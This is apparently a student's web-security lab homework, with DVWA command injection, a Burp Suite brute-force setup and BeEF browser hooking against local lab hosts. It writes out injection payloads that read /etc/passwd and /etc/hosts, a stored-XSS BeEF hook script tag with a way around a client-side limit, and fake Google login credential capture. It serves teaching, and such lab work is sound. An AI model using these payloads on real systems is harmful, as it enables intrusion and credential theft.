# Unit 15 Homework

### Web Application 1: *Your Wish is My Command Injection*

1. Complete the following to set up the activity. 

    - Start Terminal and run `cd Documents/web-vulns && docker-compose up`

    - Navigate to the following webpage: <http://192.168.13.25> and select the **Command Injection** option.
    
      - The web page should look like the following:

        ![DVWA Code Injection](https://github.com/naseebahikram/Homework-15/blob/main/Homework%2015%20Pictures/DVWA%20Code%20Injection.PNG)


2. This page is a new web application built by Replicants in order to enable their customers to `ping` an IP address. The web page will return the results of the ping command back to the user.

    - Complete the following steps to walkthrough the intended purpose of the web application. 

      - Test the webpage by entering the IP address `8.8.8.8`. Press Submit to see the results display on the web application.

     ![DVWA Ping 8.8.8.8](Images/wd_hw2.png)

     - This process is no different than if we went to the command line and typed that same command: `ping 8.8.8.8`

       ![Terminal Ping 8.8.8.8](Images/wd_hw3.png)

3. Test if we can manipulate the input to cause an unintended result.

    - On the same webpage, enter the following command (payload) in the field: `8.8.8.8 && pwd`

    - This command uses two ampersands to add a second command to the original request:

      - Terminal `ping 8.8.8.8 && pwd`: 

        [Terminal ping & pwd]()
  
   - DVWA `8.8.8.8 && pwd`:

      [DVWA ping & pwd]()


4. Now that you have determined that Replicants new application is vulnerable to command injection, you are tasked with using the dot-dot-slash method to design two payloads that will display the contents of the following files:
   
    - DVWA `8.8.8.8 && cat /../etc/passwd`
      
      [DVWA ping & cat]()
    
    - Terminal `ping 8.8.8.8 && cat /../etc/passwd`

    [Terminal ping & cat]()

    - DVWA `8.8.8.8 && cat /../etc/hosts`

      [DVWA ping & cat]()

    - Terminal `ping 8.8.8.8 && cat /../etc/hosts`

      [Terminal ping & cat]()
  

5. **Deliverable**: Take a screen shot confirming that this exploit was successfully executed and provide 2-3 sentences outlining mitigation strategies. 

  - Run with restricted permissions
    - This will reduce the number of users that can access the database. It will also secure the location of all the confidential files and directories. 
  - Don't use command line calls if possoble
    - Use APIs whenever possible

### Web Application 2: *A Brute Force to Be Reckoned With*

1. Complete the following steps to set up the activity. 

    - Open a terminal and run `sudo burpsuite`
    
    - Open a browser on Vagrant and navigate to the webpage <http://192.168.13.35/login.php>.
  
    -  The page should look like the following:

      - Login: `bee`

      - Password: `bug`

    - This will take you to the following page:

      ![bWAPP login](Images/wd_hw7.png)

    - To access the application where we will perform our activity, enter in the following URL: <http://192.168.13.35/ba_insecure_login_1.php>

      - This will take you to the following page:

        ![bWAPP Broken Auth](Images/wd_hw8.png)

        [BurpSuite Interception](Images/wd_hw8.png)

        [Cluster Bomb](Images/wd_hw8.png)

        [Payload 1](Images/wd_hw8.png)

        [Payload 2](Images/wd_hw8.png)



 
4. **Deliverable**: Take a screen shot confirming that this exploit was successfully executed and provide 2-3 sentences outlining mitigation strategies. 

### Web Application 3: *Where's the BeEF?*

1. Complete the following to set up the activity. 

   - When you ran `docker-compose up`, you also brought up a containerized instance of the BeEF Framework. 
   
   - To access the BeEF User Interface (UI), navigate to `http://127.0.0.1:3000/ui/panel`.

   - When the BeEF webpage opens, login with the following credentials:
     - Username: `beef`
     
     - Password: `feeb`

     ![wd_hw11](Images/wd_hw11.png)

   - You have successfully completed the setup when you have reached the `BeEF Control Panel` shown in the image below:

     ![wd_hw12](Images/wd_hw12.png)

2. The Browser Exploitation Framework (BeEF) is a practical client-side attack tool that exploits vulnerabilities of web browsers to assess the security posture of a target.      

   - While BeEF was developed for lawful research and penetration testing, criminal hackers leverage it as an attack tool.
  
   - An attacker takes a small snippet of code, called a BeEF Hook, and determines a way to add this code into a target website. This is commonly done by cross-site scripting.

   - When subsequent users access the infected website, the users' browsers become *hooked*.
     - Once a browser is hooked, it is referred to as a **zombie**. A zombie is an infected browser that awaits instructions from the BeEF control panel.
     - The BeEF control panel has hundreds of exploits that can be launch against the *hooked* victims, including:
       - Social engineering attacks 
       - Stealing confidential data from the victim's machine
       - Accessing system and network information from the victim's machine
       
3. BeEF includes a feature to test out a simulation of an infected website.
    
    - To access this simulated infected website, locate the following sentence on the BeEF control panel: `To begin with, you can point a browser towards the basic demo page here, or the advanced version here.`
    
    - Click the second "here" to access the advanced version.  
     
       ![wd_hw13](Images/wd_hw13.png)

    - This will open the following website, which has been infected with a BeEF hook.

       ![wd_hw14](Images/wd_hw14.png)

    - Note that once you have pulled up this infected webpage, your browser has now been hooked!

    	- If your browser has not been hooked, restart your browser and try again.

    -  Return to the control panel. On the left side, you can notice that your browser has become infected since accessing the infected Butcher website. Note that if multiple browsers become infected they will all be listed individually on the left hand side of this panel.

      - Click on the browser `127.0.0.1` as indicated in the screenshot below.

        ![wd_hw15](Images/wd_hw15.png)

      - Under the Details tab, we can see information about the infected browser. 

4. Now we are ready to test an exploit.

    - Select the Commands tabs. 
    
      - This will list folders of hundreds of exploits that can be ran against the hooked browser. Note that many may not work, as they are dependent on the browser and security settings enabled.
  
   - First, we'll attempt a social engineering phishing exploit to create a fake Google login pop up. We can use this to capture user credentials.
     
   - To access this exploit, select Google Phishing under Social Engineering.

       ![wd_hw16](Images/wd_hw16.png)

   - After selecting this option, the description of the exploit and any dependencies or options are displayed in the panel on the right.

       ![wd_hw17](Images/wd_hw17.png)

   - To launch the exploit, select Execute in the bottom right corner.

     - After selecting Execute, return back to your browser that was displaying the Butcher Shop website. Note that it has been changed to a Google login page.

     - A victim could easily mistake this for a real login prompt.

   - Lets see what would happen if a victim entered in their credentials. Use the following credentials to login in to the fake Google page. 
     - Username: `hackeruser`
     - Password: `hackerpass`

       ![wd_hw18](Images/wd_hw18.png)

   - Return to the BeEF control panel. In the center panel, select the first option. Note that now on the right panel, the username and password have been captured by the attacker.

     ![wd_hw19](Images/wd_hw19.png)

5. Now that you know how to use the BeEF tool, you'll use it to test the Replicants web application. You are tasked with using a stored XSS attack to inject a BeEF hook into Replicants' main website.

   - Task details:
     - The page you will test is the Replicants Stored XSS application which was used the first day of this unit: `http://192.168.13.25/vulnerabilities/xss_s/`
     - The BeEF hook, which was returned after running `docker-compose up` was: `http://127.0.0.1:3000/hook.js`
     - The payload to inject with this BeEF hook is: `<script src="http://127.0.0.1:3000/hook.js"></script>`

   -  When you attempt to inject this payload,  you will encounter a client-side limitation that will not allow you to enter the whole payload. You will need to find away around this limitation.    
      
      - **Hint:** Try right-clicking and selecting "Inspecting the Element".
    
   - Once you are able to hook into Replicants website, attempt a couple BeEF exploits. Some that work well include:
     
     - Social Engineering >> Pretty Theft
     
     - Social Engineering >> Fake Notification Bar
     
     - Host >> Get Geolocation (Third Party)
    
6. **Deliverable**: Take a screen shot confirming that this exploit was successfully executed and provide 2-3 sentences outlining mitigation strategies. 

---
